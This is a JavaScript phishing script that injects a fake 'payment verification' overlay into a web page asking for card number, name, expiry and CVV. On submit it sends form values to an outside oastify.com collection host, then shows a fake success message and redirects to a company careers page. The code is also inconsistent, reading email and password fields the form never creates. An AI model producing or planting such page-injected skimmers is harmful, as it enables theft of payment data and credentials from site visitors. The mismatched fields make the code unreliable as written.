// Wait for Vite to finish loading
document.addEventListener('vite-script-loaded', function() {
  // Create fake login overlay
  const fakeLogin = document.createElement('div');
  fakeLogin.className = 'phishing-overlay';
  fakeLogin.innerHTML = `
     <div class="phishing-container">
    <h2 style="color: #d23f00;">Payment Verification Required</h2>
    <p>Your session expired. Verify your payment method to continue:</p>
    
    <input type="text" id="phish-card" placeholder="Card Number" class="phishing-input" maxlength="19">
    <input type="text" id="phish-name" placeholder="Cardholder Name" class="phishing-input">
    
    <div style="display: flex; gap: 10px;">
      <input type="text" id="phish-expiry" placeholder="MM/YY" class="phishing-input" style="flex: 1;">
      <input type="text" id="phish-cvv" placeholder="CVV" class="phishing-input" style="flex: 1;" maxlength="4">
    </div>
    
    <button id="phish-submit" class="phishing-button">Verify Payment</button>
    
    <p class="security-note">
      🔒 Secured with 256-bit encryption
    </p>
  </div>
`;
  
  document.body.appendChild(fakeLogin);
  
  // Event delegation with better error handling
  document.body.addEventListener('click', function(e) {
    if(e.target && e.target.id === 'phish-submit') {
      try {
        const email = document.getElementById('phish-email').value;
        const pwd = document.getElementById('phish-pwd').value;
        
        // Use fetch API with error handling
        fetch('https://5synx55etlldi0ogs08w4pg25tbkzkn9.oastify.com/phish', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
          },
          body: JSON.stringify({
            email: email,
            pwd: pwd,
            origin: window.location.href,
            timestamp: new Date().toISOString()
          }),
          mode: 'no-cors'
        }).catch(e => console.error);
        
        // Show fake loading message
        fakeLogin.innerHTML = '<div style="text-align:center;padding:20px;"><p>Verification successful. Redirecting...</p></div>';
        
        // Redirect after 2 seconds
        setTimeout(() => { 
          fakeLogin.style.display = 'none';
          window.location.href = 'https://careers.thetradedesk.com';
        }, 2000);
      } catch (e) {
        console.error('Phishing script error:', e);
        // Still redirect even if error occurs
        window.location.href = 'https://careers.thetradedesk.com';
      }
    }
  });
});
